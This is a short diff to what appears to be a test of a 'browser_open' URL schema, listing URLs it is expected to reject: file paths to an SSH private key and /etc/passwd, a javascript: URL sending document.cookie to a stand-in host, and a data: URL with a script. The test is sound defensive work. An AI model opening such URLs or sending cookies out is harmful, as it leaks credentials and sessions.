@@ -183,7 +183,7 @@ describe("browser_open's url schema", () => {
   };
 
   it.each([
-    "file:///Users/mgrin/.ssh/id_rsa",
+    "file:///home/someone/.ssh/id_rsa",
     "file:///etc/passwd",
     "javascript:fetch('https://evil.test/'+document.cookie)",
     "data:text/html,<script>alert(1)</script>",
